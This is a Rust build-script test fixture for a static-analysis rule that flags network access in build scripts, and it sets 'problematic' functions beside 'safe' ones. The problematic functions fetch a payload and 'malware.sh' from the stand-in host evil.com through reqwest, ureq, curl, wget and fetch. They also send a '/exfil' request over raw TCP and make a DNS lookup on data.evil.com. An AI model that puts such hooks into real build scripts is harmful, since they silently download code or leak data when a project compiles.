//! Build script with INTENTIONAL PROBLEMATIC patterns for testing RUSTCOLA097
//!
//! Build scripts should NOT:
//! - Make network requests
//! - Download files from the internet
//! - Execute arbitrary commands that contact external systems
//!
//! Expected: 10 PROBLEMATIC patterns detected

use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() {
    // ========================================================================
    // PROBLEMATIC PATTERNS - Network/process access in build scripts
    // ========================================================================

    // PROBLEMATIC: Direct network request with reqwest
    bad_reqwest_get();

    // PROBLEMATIC: Direct network request with ureq
    bad_ureq_get();

    // PROBLEMATIC: Raw TCP connection
    bad_tcp_connect();

    // PROBLEMATIC: Command that does network access
    bad_curl_command();

    // PROBLEMATIC: wget command
    bad_wget_command();

    // PROBLEMATIC: git clone from network
    bad_git_clone();

    // PROBLEMATIC: HTTP download via process
    bad_http_download();

    // PROBLEMATIC: DNS lookup (data exfiltration vector)
    bad_dns_lookup();

    // ========================================================================
    // SAFE PATTERNS - Legitimate build script operations
    // ========================================================================

    // SAFE: Running local compiler tools
    safe_local_command();

    // SAFE: File system operations
    safe_file_operations();

    // SAFE: Printing cargo instructions
    safe_cargo_println();

    // SAFE: Environment variable access
    safe_env_access();
}

// ============================================================================
// PROBLEMATIC IMPLEMENTATIONS
// ============================================================================

fn bad_reqwest_get() {
    // PROBLEMATIC: Network request in build script
    let _response = reqwest::blocking::get("https://evil.com/payload");
}

fn bad_ureq_get() {
    // PROBLEMATIC: Network request in build script
    let _response = ureq::get("https://evil.com/payload").call();
}

fn bad_tcp_connect() {
    // PROBLEMATIC: Raw TCP connection
    if let Ok(mut stream) = TcpStream::connect("evil.com:80") {
        let _ = stream.write_all(b"GET /exfil HTTP/1.0\r\n\r\n");
        let mut response = String::new();
        let _ = stream.read_to_string(&mut response);
    }
}

fn bad_curl_command() {
    // PROBLEMATIC: curl command execution
    Command::new("curl")
        .args(["https://evil.com/payload", "-o", "target/payload"])
        .output()
        .ok();
}

fn bad_wget_command() {
    // PROBLEMATIC: wget command execution
    Command::new("wget")
        .args(["https://evil.com/malware.sh"])
        .output()
        .ok();
}

fn bad_git_clone() {
    // PROBLEMATIC: git clone from network
    Command::new("git")
        .args(["clone", "https://github.com/evil/repo.git"])
        .output()
        .ok();
}

fn bad_http_download() {
    // PROBLEMATIC: Using fetch/download utilities
    Command::new("fetch")
        .args(["https://evil.com/data"])
        .output()
        .ok();
}

fn bad_dns_lookup() {
    // PROBLEMATIC: DNS lookup for data exfiltration
    use std::net::ToSocketAddrs;
    let _ = "data.evil.com:80".to_socket_addrs();
}

// ============================================================================
// SAFE IMPLEMENTATIONS
// ============================================================================

fn safe_local_command() {
    // SAFE: Running local build tools
    Command::new("rustc").args(["--version"]).output().ok();

    Command::new("cc")
        .args(["-c", "native/lib.c"])
        .output()
        .ok();
}

fn safe_file_operations() {
    // SAFE: Reading local files
    use std::fs;
    let _ = fs::read_to_string("Cargo.toml");
    let _ = fs::create_dir_all("target/out");
}

fn safe_cargo_println() {
    // SAFE: Cargo build script instructions
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rustc-link-lib=native");
}

fn safe_env_access() {
    // SAFE: Environment variable access
    use std::env;
    let _ = env::var("OUT_DIR");
    let _ = env::var("TARGET");
}
